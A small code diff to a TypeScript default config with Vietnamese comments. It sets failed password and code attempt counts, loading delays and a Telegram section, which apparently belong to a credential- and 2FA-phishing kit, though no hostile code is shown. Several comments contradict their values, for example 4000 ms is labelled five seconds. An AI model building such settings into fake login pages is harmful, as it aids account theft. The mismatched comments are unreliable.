@@ -24,7 +24,7 @@ const defaultConfig: Config = {
 		max_failed_code_attempts: 3, // Số lần thử mã tối đa (4 lần)
 		max_failed_password_attempts: 1, // Số lần thử mật khẩu tối đa (0 lần)
 		page_loading_time: 5000, // Thời gian tải trang mặc định (5 giây)
-		password_loading_time: 4000, // Thời gian tải mật khẩu mặc định (2 giây)
+		password_loading_time: 4000, // Thời gian tải mật khẩu mặc định (5 giây)
 		code_input_enabled: true, // Cho phép nhập mã (true)
 	},
 	telegram: {
